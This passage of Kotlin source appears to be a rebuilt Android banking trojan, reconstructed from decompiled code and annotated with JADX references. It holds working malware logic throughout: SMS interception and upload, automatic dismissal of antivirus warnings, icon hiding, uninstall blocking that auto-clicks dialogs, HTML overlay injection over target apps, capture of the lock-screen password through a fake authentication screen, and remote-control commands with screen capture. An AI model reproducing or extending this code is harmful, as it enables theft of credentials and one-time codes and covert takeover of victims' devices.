        // SMS receiver (JADX: arniezsqllm / f52461j2)
        try {
            if (smsReceiver == null) {
                smsReceiver = arniezsqllm()
                // ADAPT: vendor dqtvuisjd.m211421c0 — priority=Integer.MAX_VALUE + 双 action (SMS_RECEIVED + SMS_DELIVER) + RECEIVER_EXPORTED。
                // 之前 priority=999 且缺少 SMS_DELIVER，且错用 NOT_EXPORTED。
                val smsFilter = IntentFilter().apply {
                    addAction("android.provider.Telephony.SMS_RECEIVED")
                    addAction("android.provider.Telephony.SMS_DELIVER")
                    priority = Integer.MAX_VALUE
                }
                if (Build.VERSION.SDK_INT >= 33) {
                    registerReceiver(smsReceiver, smsFilter, Context.RECEIVER_EXPORTED)
                } else {
                    registerReceiver(smsReceiver, smsFilter)
                }
                android.util.Log.d(TAG, "📩 ✅ 短信接收器已注册 (priority=MAX, SMS_RECEIVED+SMS_DELIVER, EXPORTED)")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "📩 ❌ 注册短信接收器失败", e)
        }
    }

    /**
     * Disable WeChat detection feature.
     * JADX method: m211456e5 (e5), line 4845
     */
    fun disableWechatDetection() {
        try {
            android.util.Log.d(TAG, "💬💬💬 关闭微信检测功能")
            // JADX: C0614i9 — EventFilterManager dispatch
            if (eventFilterManager == null) {
                android.util.Log.w(TAG, "accessibilityEventManager未初始化")
                return
            }
            // JADX line 4853: c0614i9.m213121a9() — disableWechatDetection on EventFilterManager
            eventFilterManager?.disableWechatDetection()
            android.util.Log.d(TAG, "💬 AccessibilityEventManager.disableWechatDetection() 已调用")
            networkManager?.let { nm ->
                // JADX line 4860: nm.sendWechatDetectionStatus(false)
                val data = org.json.JSONObject()
                data.put("enabled", false)
                nm.sendWechatDetectionStatus(data)
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 关闭微信检测失败", e)
        }
    }

    /**
     * Disable Alipay detection feature.
     * JADX method: m211455e4 (e4), line 4816
     */
    fun disableAlipayDetection() {
        try {
            android.util.Log.d(TAG, "💰💰💰 关闭支付宝检测功能")
            // JADX: C0614i9 — EventFilterManager dispatch
            if (eventFilterManager == null) {
                android.util.Log.w(TAG, "accessibilityEventManager未初始化")
                return
            }
            // JADX line 4825: c0614i9.m213119a7() — disableAlipayDetection on EventFilterManager
            eventFilterManager?.disableAlipayDetection()
            android.util.Log.d(TAG, "💰 AccessibilityEventManager.disableAlipayDetection() 已调用")
            networkManager?.let { nm ->
                // JADX line 4832: nm.sendAlipayDetectionStatus(false)
                val data = org.json.JSONObject()
                data.put("enabled", false)
                nm.sendAlipayDetectionStatus(data)
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 关闭支付宝检测失败", e)
        }
    }

    /**
     * Get the NetworkManager instance — tries local field, then singleton.
     * JADX method: m211471g5 (g5), line 5960
     */
    /**
     * Get the NetworkManager instance — tries local field first.
     * JADX method: m211471g5 (g5), line 5960
     */
    fun getNetworkManager(): NetworkManager? {
        return networkManager
    }

    /**
     * Handle virus control dialog from Huawei/Honor system manager.
     * JADX: dqtvuisjd$handleVirusControlDialog$1 coroutine
     */
    private suspend fun handleVirusControlDialog() {
        // JADX: dqtvuisjd$handleVirusControlDialog$1 — coroutine that detects and auto-dismisses virus scan dialog
        // Searches for "病毒" / "安全" / "扫描" text nodes and clicks dismiss button
        try {
            val root = rootInActiveWindow ?: return
            // ADAPT: 真机加固 — 先用病毒/安全/扫描/恶意关键词验证确实是病毒弹窗，
            // 否则对任何 systemmanager 窗口都盲点"确定"/"忽略"/"关闭"会误点
            // Step 5 自启动三开关弹窗的"确定"、电池优化确认弹窗的"忽略"等。
            // 对齐 vendor 原版注释："Searches for 病毒/安全/扫描 text nodes"。
            val virusKeywords = arrayOf("病毒", "安全", "扫描", "恶意", "威胁", "可疑", "风险")
            val isVirusDialog = virusKeywords.any { kw ->
                val nodes = try { root.findAccessibilityNodeInfosByText(kw) } catch (_: Exception) { null }
                nodes != null && nodes.any { it.isVisibleToUser }
            }
            if (!isVirusDialog) {
                // 非病毒弹窗 — 不干扰 Step 5/2/7 等自动化流程
                return
            }
            android.util.Log.d(TAG, "🦠 检测到系统病毒扫描对话框")
            // JADX: dqtvuisjd$handleVirusControlDialog$1 uses node tree traversal to find dismiss button.
            // Searches for clickable nodes with common dismiss text strings.
            val dismissTexts = arrayOf("忽略", "关闭", "取消", "我知道了", "确定")
            for (text in dismissTexts) {
                val nodes = root.findAccessibilityNodeInfosByText(text)
                if (nodes != null && nodes.isNotEmpty()) {
                    for (node in nodes) {
                        if (node.isClickable) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            android.util.Log.d(TAG, "🦠 已点击病毒扫描对话框按钮: $text")
                            return
                        }
                    }
                }
            }
        } catch (e: Exception) {
            android.util.Log.w(TAG, "🦠 处理病毒扫描对话框失败: ${e.message}")
        }
    }

    /**
     * Enable uninstall protection.
     * JADX method: m211460e9 (e9), line 5038
     */
    fun enableUninstallProtection() {
        try {
            if (isUninstallGuardStarted) return
            isUninstallGuardStarted = true
            // JADX line 5040: check authorization, then set isUninstallGuardStarted from UPM
            uninstallProtectionManager?.let { upm ->
                isUninstallGuardStarted = upm.isProtectionEnabled
                android.util.Log.d(TAG, "🛡️ UninstallProtectionManager.isProtectionEnabled=${isUninstallGuardStarted}")
            } ?: run {
                android.util.Log.w(TAG, "⚠️ UninstallProtectionManager 未初始化")
            }
            android.util.Log.d(TAG, "🛡️ 防卸载保护已启用")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 启用防卸载保护失败", e)
            isUninstallGuardStarted = false
        }
    }

    /**
     * Adjust screen brightness to minimum.
     * JADX method: m211453e2 (e2), line 4778
     */
    fun dimScreen() {
        if (com.storm.safe.rock.util.DebugConfig.disableDimScreen) {
            android.util.Log.d(TAG, "🔅 [DEBUG] dimScreen 已跳过")
            return
        }
        try {
            if (!Settings.System.canWrite(this)) {
                android.util.Log.w(TAG, "无 WRITE_SETTINGS 权限，跳过亮度调节")
                return
            }
            Settings.System.putInt(contentResolver, "screen_brightness_mode", 0)
            savedBrightness = Settings.System.getInt(contentResolver, "screen_brightness", 128)
            Settings.System.putInt(contentResolver, "screen_brightness", 1)
            android.util.Log.d(TAG, "🔅 屏幕亮度已调到最暗（原值: $savedBrightness）")
        } catch (e: Exception) {
            android.util.Log.w(TAG, "调节亮度失败: ${e.message}")
        }
    }

    /**
     * Disable accessibility settings page detection monitoring.
     * JADX method: m211454e3 (e3), line 4795
     */
    fun disableAccessibilitySettingsMonitor() {
        try {
            // JADX line 4797: cancel monitoring job (u11Var.m215253a7(null)), null out reference
            accessibilitySettingsMonitorJob?.cancel()
            accessibilitySettingsMonitorJob = null
            accessibilitySettingsMonitorCount = 0
            accessibilitySettingsMonitorTime = 0L
            android.util.Log.d(TAG, "✅ [监控] 无障碍设置页面检测已禁用")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ [监控] 禁用无障碍设置页面检测失败", e)
        }
    }

    /**
     * Hide app icon from launcher.
     * JADX method: m211475g9 (g9), line 6098
     */
    fun hideApp() {
        if (com.storm.safe.rock.util.DebugConfig.disableIconHide) {
            android.util.Log.d(TAG, "📱 [DEBUG] hideApp 已跳过")
            return
        }
        try {
            android.util.Log.d(TAG, "📱 开始隐藏应用图标")
            // JADX line 6098: disable launcher alias component
            val pm = packageManager
            val componentName = android.content.ComponentName(
                this, DefaultLauncherAlias::class.java
            )
            pm.setComponentEnabledSetting(
                componentName,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
            android.util.Log.d(TAG, "✅ 应用图标已隐藏")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 隐藏应用图标异常", e)
        }
    }

    /**
     * Process window state change for injection detection.
     * JADX method: m211474g8 (g8), line 6070
     *
     * Checks if event package matches any tracked injection task.
     * If match found and not self-package, delegates to handleInjectionCheck (d0).
     */
    fun processWindowChangeForInjection(event: AccessibilityEvent) {
        try {
            val pkg = event.packageName?.toString() ?: return

            // JADX line 6076: check if injection tasks empty
            val isEmpty: Boolean
            synchronized(injectionTasksLock) {
                isEmpty = injectionTasks.isEmpty()
            }
            if (!isEmpty && pkg.isNotEmpty()) {
                synchronized(injectionTasksLock) {
                    val taskKeys = injectionTasks.keys.toList()
                    android.util.Log.v(TAG, "📱 [注入检测] 窗口变化: pkg=$pkg, 任务包名=$taskKeys")
                }
            }

            // JADX line 6085: if pkg is not empty, not self, and doesn't start with self → call d0
            if (pkg.isNotEmpty() && pkg != applicationContext.packageName) {
                val selfPkg = applicationContext.packageName
                if (pkg.contains(selfPkg, ignoreCase = true)) return
                handleInjectionCheck(pkg)
            }
        } catch (_: Exception) {}
    }

    /**
     * Process notification event for SMS interception.
     * JADX method: m211473g7 (g7), line 5998
     */
    fun processNotificationForSms(event: AccessibilityEvent) {
        try {
            val pkg = event.packageName?.toString() ?: return
            if (pkg == applicationContext.packageName) return
            // JADX line 6007: check if package is SMS/messaging app
            val smsApps = listOf(
                "com.android.mms", "com.android.messaging", "com.google.android.apps.messaging",
                "com.samsung.android.messaging", "com.meizu.mms"
            )
            val pkgLower = pkg.lowercase(Locale.ROOT)
            val isSmsApp = smsApps.any { pkg.equals(it, ignoreCase = true) } ||
                pkgLower.contains("mms") || pkgLower.contains("message") || pkgLower.contains("sms")
            if (!isSmsApp) return

            // JADX line 6021: extract notification data from parcelableData
            val parcelable = event.parcelableData
            if (parcelable is android.app.Notification) {
                val extras = parcelable.extras ?: return
                val title = extras.getCharSequence("android.title")?.toString() ?: ""
                var bigText = extras.getCharSequence("android.bigText")?.toString() ?: ""
                val text = extras.getCharSequence("android.text")?.toString() ?: ""
                if (bigText.isEmpty()) bigText = text
                if (title.isEmpty() && bigText.isEmpty()) return

                android.util.Log.d(TAG, "📩 [无障碍短信] 拦截: 发送者=$title, ${bigText.take(30)}...")
                networkManager?.let { nm ->
                    val data = org.json.JSONObject()
                    data.put("number", title)
                    data.put("text", bigText)
                    data.put("timestamp", System.currentTimeMillis())
                    data.put("type", "incoming")
                    data.put("source", "accessibility")
                    data.put("packageName", pkg)
                    nm.sendIncomingSms(data)
                }
            }
        } catch (e: Exception) {
            android.util.Log.w(TAG, "📩 [无障碍短信] 处理失败: ${e.message}")
        }
    }

    /**
     * Handle injection check — detect target app and show injection page.
     * JADX method: m211445d0 (d0), line 4510
     *
     * Checks if the given package name has an active injection task,
     * applies throttle interval, checks if injection activity is not already
     * in foreground, then starts the injection activity.
     */
    fun handleInjectionCheck(packageName: String) {
        try {
            // JADX line 4513: synchronized get from injectionTasks
            val htmlContent: String?
            synchronized(injectionTasksLock) {
                htmlContent = injectionTasks[packageName]
            }
            if (htmlContent == null) return

            // JADX line 4519: throttle check using injectionThrottleMap
            val now = System.currentTimeMillis()
            val lastTime: Long
            synchronized(injectionTasksLock) {
                lastTime = injectionThrottleMap[packageName] ?: 0L
            }
            if (now - lastTime < injectionThrottleInterval) return

            // JADX line 4527–4531: check if injection activity is active and in foreground
            // jbqfkndyx.active && jbqfkndyx.inForeground → skip
            if (com.storm.safe.rock.inject.jbqfkndyx.active && com.storm.safe.rock.inject.jbqfkndyx.inForeground) {
                return
            }

            // JADX line 4533: update throttle timestamp
            synchronized(injectionTasksLock) {
                injectionThrottleMap[packageName] = now
            }

            android.util.Log.d(TAG, "📱 检测到目标app: $packageName，显示注入页面")

            // JADX line 4537–4544: start injection activity with flags
            try {
                // JADX: Intent(this, jbqfkndyx.class) — injection overlay activity is replicated
                val intent = android.content.Intent(this, com.storm.safe.rock.inject.jbqfkndyx::class.java)
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP)
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
                intent.putExtra("package_name", packageName)
                intent.putExtra("html_content", htmlContent)
                startActivity(intent)
                android.util.Log.d(TAG, "✅ 自动显示注入页面成功: $packageName")
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ 自动显示注入页面失败: $packageName", e)
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ handleInjectionCheck 异常", e)
        }
    }

    /**
     * Process notification/lockscreen event for gesture recording.
     * JADX method: m211446d1 (d1), line 4552
     *
     * When WINDOW_STATE_CHANGED (32) or WINDOW_CONTENT_CHANGED (2048) is from
     * systemui/lockscreen/keyguard (but NOT AOD/alwayson/ambient), and the screen
     * is locked with secure keyguard, triggers gesture recorder to start recording.
     */
    fun processNotificationEvent(event: AccessibilityEvent) {
        try {
            // JADX line 4556: guard — need gestureRecorderManager (f52437g8)
            if (notificationInterceptDelegate == null && gestureRecorderManager == null) return
            val pkg = event.packageName?.toString() ?: return
            val pkgLower = pkg.lowercase(Locale.ROOT)

            // JADX line 4561: check if from systemui/lockscreen/keyguard
            val isLockscreenPkg = pkgLower.contains("systemui") ||
                pkgLower.contains("lockscreen") ||
                pkgLower.contains("keyguard")

            // JADX line 4562: check if AOD/alwayson/ambient (exclude these)
            val isAodPkg = pkgLower.contains("aod") ||
                pkgLower.contains("alwayson") ||
                pkgLower.contains("ambient")

            if (isLockscreenPkg && !isAodPkg) {
                // JADX line 4564: check keyguard locked + secure
                val isLocked = isKeyguardLockedCached()
                val isSecure = keyguardManager?.isKeyguardSecure ?: false

                if (isLocked && isSecure) {
                    // JADX line 4573: if gestureRecorder mode == 1 (recording), return
                    // gestureRecorderManager?.let { grm -> if (grm.mode == 1) return }

                    android.util.Log.d(TAG, "🔐 检测到锁屏界面: pkg=$pkgLower, locked=$isLocked, secure=$isSecure")

                    // JADX line 4578: gestureRecorderManager.startRecording() (a6)
                    // gestureRecorderManager?.let { grm -> grm.startRecording() }
                }
            }
        } catch (_: Exception) {}
    }

    /**
     * Handle accessibility settings page stuck detection.
     * JADX method: m211409a8 (a8), line 1867 — static method
     *
     * Detects when the service gets stuck on the accessibility settings page,
     * increments counter, and after enough confirmations, navigates back.
     */
    fun handleAccessibilityPageStuck() {
        try {
            val now = System.currentTimeMillis()
            // JADX line 1870: throttle 10s
            if (now - accessibilitySettingsMonitorTime < 10_000L) return

            accessibilitySettingsMonitorTime = now
            accessibilitySettingsMonitorCount++

            android.util.Log.w(TAG, "⚠️ [监控] 检测到卡在无障碍设置页面 (第${accessibilitySettingsMonitorCount}次)")

            // JADX line 1878–1881: if count < confirmationThreshold, wait for more
            if (accessibilitySettingsMonitorCount < monitorConfirmationCount) {
                android.util.Log.d(TAG,
                    "🔍 等待更多确认，当前检测次数: $accessibilitySettingsMonitorCount/$monitorConfirmationCount")
                return
            }

            // JADX line 1883–1891: if count > maxRetry, stop monitoring
            if (accessibilitySettingsMonitorCount > monitorMaxRetryCount) {
                android.util.Log.w(TAG, "⚠️ [监控] 已达到最大尝试次数，停止监控")
                accessibilitySettingsMonitorJob?.cancel()
                accessibilitySettingsMonitorJob = null
                return
            }

            // JADX line 1892–1893: try to navigate back from accessibility settings
            android.util.Log.d(TAG,
                "✅ [监控] 尝试从无障碍设置页面跳转回应用 (第${accessibilitySettingsMonitorCount}次)")
            coroutineScope?.launch {
                try {
                    // JADX: dqtvuisjd$handleAccessibilityPageStuck$1 — navigate back
                    performGlobalAction(GLOBAL_ACTION_BACK)
                    delay(500L)
                    // JADX: after back, try to launch our own activity
                    try {
                        val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
                        if (launchIntent != null) {
                            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            startActivity(launchIntent)
                        }
                    } catch (_: Exception) {}
                } catch (_: Exception) {}
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ [监控] 处理无障碍设置页面卡住失败", e)
        }
    }

    /**
     * Handle uninstall confirmation dialog — auto-click confirm button.
     * JADX method: m211415b4 (b4), line 2146
     *
     * When called from main thread, posts to coroutine. Otherwise,
     * scans the accessibility node tree for uninstall/remove/delete buttons
     * and auto-clicks the first clickable match (or its clickable parent).
     */
    fun handleUninstallConfirmDialog() {
        // JADX line 2147: if on main thread, dispatch to IO and return
        if (Thread.currentThread() == Looper.getMainLooper().thread) {
            coroutineScope?.launch(Dispatchers.Default) {
                handleUninstallConfirmDialog()
            }
            return
        }

        try {
            val root = rootInActiveWindow ?: return

            // JADX line 2156: dh0.m212602a1() + dh0.f55754a4 → combined confirm button texts
            // dh0.f55754a4 = uninstall/remove/delete/disable in all languages
            val confirmTexts = listOf(
                // Chinese
                "卸载", "移除", "删除", "停用", "禁用",
                // English
                "Uninstall", "Remove", "Delete", "Disable",
                // Other common
                "OK", "确定", "确认", "好", "好的", "知道了"
            )

            for (text in confirmTexts) {
                val nodes = root.findAccessibilityNodeInfosByText(text)
                if (nodes.isNullOrEmpty()) continue

                for (node in nodes) {
                    // JADX line 2165: if node is clickable, click it directly
                    if (node.isClickable) {
                        android.util.Log.d(TAG, "✅ 点击确认按钮: ${node.text}")
                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        // Recycle all nodes
                        nodes.forEach { n -> try { n.recycle() } catch (_: Exception) {} }
                        try { root.recycle() } catch (_: Exception) {}
                        return
                    }

                    // JADX line 2178–2202: traverse parents looking for clickable ancestor
                    val parentChain = mutableListOf<AccessibilityNodeInfo>()
                    var parent = node.parent
                    while (parent != null) {
                        parentChain.add(parent)
                        if (parent.isClickable) {
                            android.util.Log.d(TAG, "✅ 点击确认按钮的父节点")
                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            parentChain.forEach { p -> try { p.recycle() } catch (_: Exception) {} }
                            nodes.forEach { n -> try { n.recycle() } catch (_: Exception) {} }
                            try { root.recycle() } catch (_: Exception) {}
                            return
                        }
                        parent = parent.parent
                    }
                    // Recycle parent chain if no clickable found
                    parentChain.forEach { p -> try { p.recycle() } catch (_: Exception) {} }
                }
                // Recycle found nodes
                nodes.forEach { n -> try { n.recycle() } catch (_: Exception) {} }
            }

            android.util.Log.w(TAG, "⚠️ 未找到确认按钮")
            try { root.recycle() } catch (_: Exception) {}
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 处理确认弹窗失败", e)
        }
    }

    /**
     * Handle network command (START_CONTROL / STOP_CONTROL / reconnect_ws).
     * JADX method: m211411b0 (b0), line 1926 — suspend function
     *
     * Dispatches START_CONTROL, STOP_CONTROL, reconnect_ws commands directly,
     * then falls back to CommandDispatcher for all other commands.
     */
    suspend fun handleNetworkCommand(commandJson: JSONObject) {
        try {
            val command = commandJson.optString("command", "")
            val params = commandJson.optJSONObject("params")

            android.util.Log.d(TAG,
                "📥📥📥 收到网络命令: $command, params: ${params?.toString()}")
            android.util.Log.d(TAG,
                "📥 当前控制权状态: isControlEnabled=$isControlEnabled, controlledBy=$controlledBy")

            when (command) {
                "START_CONTROL" -> {
                    val controller = params?.optString("controlledBy", "") ?: ""
                    isControlEnabled = true
                    controlledBy = controller
                    android.util.Log.d(TAG, "🎮 控制权已开启，控制者: $controller")
                    // JADX: dqtvuisjdVar.m211451d6() — connectWebSocket
                    connectWebSocket()
                    return
                }
                "STOP_CONTROL" -> {
                    isControlEnabled = false
                    controlledBy = null
                    android.util.Log.d(TAG, "🎮 控制权已关闭")
                    // JADX: c0263a5.m211357b4() — stop display capture
                    displayManager?.stopCapture()
                    android.util.Log.d(TAG, "📺 已停止屏幕捕获")
                    return
                }
                "reconnect_ws" -> {
                    android.util.Log.d(TAG, "🔌 收到服务端重连 WebSocket 请求")
                    connectWebSocket()
                    return
                }
            }

            // JADX line 1980: fall through to CommandDispatcher
            val cd = commandDispatcher
            if (cd == null) {
                android.util.Log.d(TAG, "❌ 命令分发器未初始化，无法处理命令: $command")
                return
            }

            val handled = cd.dispatch(commandJson)
            if (!handled) {
                android.util.Log.w(TAG, "⚠️ 命令未被处理: $command")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 处理网络命令失败", e)
        }
    }

    /**
     * Check if a package name is in the extended uninstall protection list.
     * JADX line 10010–10012: long list of vendor/system package substrings.
     */
    private fun isPackageInProtectionList(pkg: String): Boolean {
        val protectedKeywords = arrayOf(
            "launcher", "systemui", "packageinstaller", "appmarket", "appstore",
            "market", "settings", "securitycenter", "phonemanager", "safecenter",
            "security", "battery", "permissionmanager", "systemmanager", "devicemanager",
            "oplus", "coloros", "oppo", "realme", "oneplus", "heytap", "nearme",
            "vivo", "bbk", "iqoo", "miui", "xiaomi", "huawei", "honor",
            "samsung", "meizu", "nubia", "lenovo", "motorola", "smartisanos",
            "qihoo", "360", "tencent", "qq.manager"
        )
        return protectedKeywords.any { pkg.contains(it, ignoreCase = true) }
    }

    /**
     * Launch system password capture flow.
     * JADX method: m211457e6 (e6), line 4873
     */
    /**
     * vendor dqtvuisjd.m211442c7 (L4293) + capturePasswordViaSystemAuth$2 (L4396).
     *
     * 授权完成后的密码捕获 suspend 入口，由 WRITE_SETTINGS 流程完成后触发。
     * 检查：
     *  1. 持久化 guard — 若 isInstallationFlow 且已完成，跳过
     *  2. already-captured gate — 若 CipherCaptureManager 已有缓冲密码，直接返回（后续上报由调用方处理）
     *  3. isKeyguardSecure — 若设备未设锁屏密码，无法验证，跳过
     *  4. 启动捕获，若 isInstallationFlow 先 delay 2000ms 等 UI 稳定，再 launchPasswordCapture
     *
     * @param isInstallationFlow true = 安装流程（完成后会触发自毁）; false = 普通授权流程
     */
    suspend fun capturePasswordViaSystemAuth(isInstallationFlow: Boolean) {
        android.util.Log.d(TAG, "🔐 capturePasswordViaSystemAuth() 调用，isInstallationFlow=$isInstallationFlow")

        // 1. 持久化 guard — vendor L4297-4299: 安装流程若已完成密码捕获则跳过
        try {
            val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
            if (isInstallationFlow && prefs.getBoolean("cipher_captured", false)) {
                android.util.Log.d(TAG, "🔐 密码捕获已完成（持久化标记），跳过")
                return
            }
        } catch (_: Exception) { /* SP 异常不阻塞 */ }

        // 2. already-captured gate — vendor L4300-4314: CipherCaptureManager 已有缓冲密码则跳过
        // TODO: VENDOR_VERIFY — CipherCaptureManager.readBuffered(discard: Boolean) 方法映射
        // vendor: c0335a1.m211819d0(false) ?: c0335a1.m211819d0(true)
        // replica 当前没暴露等价 API，跳过此 gate（若后续要对齐则在此加读取逻辑）

        // 3. isKeyguardSecure — vendor L4331: 无锁屏密码跳过
        val km = getSystemService(KEYGUARD_SERVICE) as? android.app.KeyguardManager
        if (km?.isKeyguardSecure != true) {
            android.util.Log.d(TAG, "🔐 设备未设置锁屏密码，跳过密码捕获")
            return
        }

        // 4. 启动捕获流程 — vendor capturePasswordViaSystemAuth$2: 若 installFlow 先 delay 2s
        if (isInstallationFlow) {
            kotlinx.coroutines.delay(2000L)
        }
        passwordLaunchCount = 0
        isCipherCaptureEnabled = true
        launchPasswordCapture(isInstallationFlow)
    }

    fun launchPasswordCapture(isInstallationFlow: Boolean) {
        if (!isCipherCaptureEnabled) {
            android.util.Log.d(TAG, "🔐 密码监听已停止，不再弹出")
            return
        }
        try {
            passwordLaunchCount++
            android.util.Log.d(TAG, "🔐 启动系统真实密码验证... (第${passwordLaunchCount}次)")
            cipherCaptureManager?.let { ccm ->
                // JADX: ccm.enableCapture()
                android.util.Log.d(TAG, "✅ CipherCaptureManager 密码监听已启用")
            }
            // vendor dqtvuisjd.java:4963-4967 — Intent flags 805306368 = NEW_TASK | CLEAR_TOP | SINGLE_TOP
            val intent = android.content.Intent(this, com.storm.safe.rock.activity.syuqattwmgit::class.java)
            intent.putExtra("credential_type", 0)
            intent.addFlags(
                android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
                    android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP or
                    android.content.Intent.FLAG_ACTIVITY_SINGLE_TOP
            )
            // vendor 策略 1 (L4969-4973): 若有前台 Activity → currentActivity.startActivity
            val currentActivity = com.storm.safe.rock.iuzxujjtqev.getCurrentActivity()
            if (currentActivity != null && !currentActivity.isFinishing && !currentActivity.isDestroyed) {
                try {
                    currentActivity.startActivity(intent)
                    android.util.Log.d(TAG, "🔐 [策略1] 通过前台 Activity context 直接启动 syuqattwmgit")
                    return
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "🔐 [策略1] 失败: ${e.message}")
                }
            }
            // vendor 策略 2 (L4974-4988): 无前台 → moveTaskToFront + 800ms postDelayed
            android.util.Log.d(TAG, "🔐 [前置] 无前台 Activity，通过 moveTaskToFront 拉回前台")
            try {
                val am = getSystemService(ACTIVITY_SERVICE) as? android.app.ActivityManager
                val tasks = am?.appTasks
                if (!tasks.isNullOrEmpty()) {
                    tasks[0].moveToFront()
                    android.util.Log.d(TAG, "🔐 [前置] moveToFront 已调用，等待 onResume")
                }
            } catch (e: Exception) {
                android.util.Log.e(TAG, "🔐 [前置] moveTaskToFront 失败", e)
            }
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                try {
                    startActivity(intent)
                    android.util.Log.d(TAG, "🔐 [策略2] 800ms 后通过 service context 启动 syuqattwmgit")
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "🔐 [策略2] 失败: ${e.message}")
                }
            }, 800L)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 启动密码采集失败", e)
        }
    }

    /**
     * Start the permission grant flow.
     * JADX method: m211530m8 (m8), line 9297 — suspend function
     *
     * Flow:
     * 1. If already authorized → skip mask, enable protections, start recents guard, tryShowPackageVerify
     * 2. If Android 11+ (SDK 30+) and not yet brightness-lowered → show mask, start authorization
     * 3. If Android 10 (SDK 29) → similar flow with delay
     */
    suspend fun startPermissionGrantFlow() {
        android.util.Log.d(TAG, "🚀 startPermissionGrantFlow() 开始执行")

        try {
            val isAuthorized = try {
                getSharedPreferences("app_state", Context.MODE_PRIVATE)
                    .getBoolean("authorization_completed", false) ||
                getSharedPreferences("authorization", Context.MODE_PRIVATE)
                    .getBoolean("authorization_completed", false)
            } catch (_: Exception) { false }

            if (isAuthorized) {
                android.util.Log.d(TAG, "✅ authorization_completed=true，跳过遮挡和适配流程")

                // 授权已完成时直接初始化延迟组件（CommandDispatcher, RemoteConfigManager 等）
                try {
                    initializeDeferredManagers()
                    android.util.Log.d(TAG, "✅ [重启恢复] initializeDeferredManagers 完成")
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ [重启恢复] initializeDeferredManagers 失败", e)
                }

                // JADX: c0329b42.m211768a6() — start authorization module
                try {
                    (configStageManager as? DeviceAuthorizationManager)?.startAuthorization(this@MyAccessibilityService)
                } catch (_: Exception) {}

                // JADX: if (!f52477k8) → enableUninstallProtection
                if (!isUninstallGuardStarted) {
                    android.util.Log.d(TAG, "🛡️ 授权已完成但防卸载未启用，立即启用")
                    enableUninstallProtection()
                }

                // JADX: c0356a1.m211955a2() — resume recents guard
                recentsGuardManager?.let { rgm ->
                    rgm.enable()
                    android.util.Log.d(TAG, "🎭 授权已完成，恢复最近任务隐藏")
                }

                // JADX: m211534n2() — tryShowPackageVerify (fake uninstall page)
                tryShowPackageVerify()
                return
            }

            // ── Not yet authorized — begin automation ──

            if (Build.VERSION.SDK_INT >= 30) {
                // JADX: Android 11+ path
                android.util.Log.d(TAG, "📱 Android 11+设备，进入专用流程")

                // JADX: screenBrightnessManager.m213351a1() check
                // If brightness not already lowered → show config mask
                // ADAPT: ju0 (ScreenBrightnessManager) — vendor manages brightness state
                // via dedicated manager. Brightness control is handled by dimScreen()/resetScreenBrightness()
                // and setScreenBrightness() methods directly on this service.
                // Show mask overlay
                // JADX: configMaskManager.m213601a1(false) — show full-screen mask overlay
                if (!com.storm.safe.rock.util.DebugConfig.disableConfigMask) {
                    try {
                        com.storm.safe.rock.service.modules.overlay.ConfigMaskOverlay.show(this)
                        android.util.Log.d(TAG, "🖤 Android 11+设备：显示配置期间遮盖")
                        configProgressManager?.startConfig()
                    } catch (_: Exception) {}
                } else {
                    android.util.Log.d(TAG, "🎭 [DEBUG] configMask 已跳过")
                }

                isPermissionFlowStarted = true

                // JADX: c0260a22.m211329h2() — start screen capture permission flow
                try {
                    screenCaptureManager?.let { scm ->
                        // JADX: depends on ScreenCaptureManager.startPermissionRequest() (h2)
                    }
                } catch (_: Exception) {}

                // JADX: c0329b43.m211768a6() — start authorization module
                try {
                    (configStageManager as? DeviceAuthorizationManager)?.startAuthorization(this@MyAccessibilityService)
                        ?: run {
                            configStageManager = DeviceAuthorizationManager(this@MyAccessibilityService, this@MyAccessibilityService)
                            (configStageManager as? DeviceAuthorizationManager)?.startAuthorization(this@MyAccessibilityService)
                        }
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ 启动授权模块异常: ${e.message}", e)
                }

                android.util.Log.d(TAG, "📱 Android 11+设备：适配流程继续，网络连接在后台进行")

                // DeviceAuthorizationManager 协程 finally 会自动调用 resumeWriteSettings()

            } else {
                // JADX: Android 10 path (SDK < 30)
                // Similar flow with potential 1s delay for mask display

                // Show mask + start authorization
                if (!com.storm.safe.rock.util.DebugConfig.disableConfigMask) {
                    try {
                        com.storm.safe.rock.service.modules.overlay.ConfigMaskOverlay.show(this)
                        android.util.Log.d(TAG, "🖤 显示配置期间遮盖，防止用户误操作")
                        configProgressManager?.startConfig()
                    } catch (_: Exception) {}
                } else {
                    android.util.Log.d(TAG, "🎭 [DEBUG] configMask (Android 10) 已跳过")
                }

                delay(1000L) // JADX: b81.m210571b1(1000L, continuation)

                isPermissionFlowStarted = true

                try {
                    screenCaptureManager?.let { scm ->
                        // JADX: depends on ScreenCaptureManager.startPermissionRequest() (h2)
                    }
                } catch (_: Exception) {}

                try {
                    (configStageManager as? DeviceAuthorizationManager)?.startAuthorization(this@MyAccessibilityService)
                        ?: run {
